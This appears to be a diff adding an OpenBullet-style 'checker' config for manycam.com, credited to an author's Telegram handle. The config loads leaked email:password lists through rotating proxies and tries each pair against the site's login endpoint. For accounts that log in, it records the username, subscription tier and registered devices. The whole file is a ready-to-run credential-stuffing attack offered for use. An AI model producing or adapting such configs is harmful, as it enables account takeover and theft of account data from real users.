@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "Manycam",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-25T16:03:48.34082+04:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 YASHVIRGAMING#0388 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://manycam.com/loginfrommodal" 
+  CONTENT "LoginForm%5Bnickname%5D=<USER>&LoginForm%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: manycam.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-GB,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 82" 
+  HEADER "Origin: https://manycam.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://manycam.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "password\":[\"Incorrect nickname or password.\"" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":{\"name\":\"" 
+
+#Username PARSE "<SOURCE>" LR "\"user\":{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#GET_SUBCRIPTION REQUEST GET "https://manycam.com/my/subscriptions/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Subscription PARSE "<SOURCE>" LR "<span class=\"edition\" style=\"color: #4ed0e5\">" "</span>" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#GET_DEVICE REQUEST GET "https://manycam.com/my/devices/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#My_Device PARSE "<SOURCE>" LR "<div class=\"text-container\">" "</div>" CreateEmpty=FALSE -> CAP "My Device" 
+
+#Credits FUNCTION Constant "http://t.me/YashvirGaming0388" -> CAP "Config By" 
+
